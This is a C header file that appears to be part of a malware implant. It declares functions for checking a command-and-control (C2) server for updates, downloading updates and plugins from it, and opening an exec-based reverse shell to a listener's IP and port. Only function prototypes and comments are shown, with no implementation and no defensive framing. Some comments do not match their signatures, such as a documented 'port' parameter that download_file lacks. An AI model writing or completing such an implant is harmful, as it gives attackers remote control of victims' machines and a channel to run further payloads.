#ifndef NETWORK_UTILS_H
#define NETWORK_UTILS_H

#include "../include/system_utils.h"

#define EXIT_COMMAND "exit\n"

struct sockaddr_in;

/**
 * C2 update checker
 *
 * It looks for new updates on C2 server
 *
 * ip_addr - String with ip address of the listener
 *
 * Returns - OK or ERROR
*/
int check_update(char *ip_addr, int *state);

/**
 * C2 downloader
 *
 * It downloads updates from C2 server web
 *
 * ip_addr - String with ip address of the listener
 * port - int where the port goes.
 * type - 0 for an update, 1 for a plugin
 *
 * Returns - OK or ERROR
*/
int download_file(char *ip_addr, int type);

/**
 * Reverse shell using exec
 *
 * It has the same limitations as exec. You can end the reverse shell by typing exit.
 *
 * ip_addr - String with ip address of the listener
 * port - int where the port goes.
 *
 * Returns - OK or ERROR
*/
int reverse_shell(char *ip_addr, int port);

#endif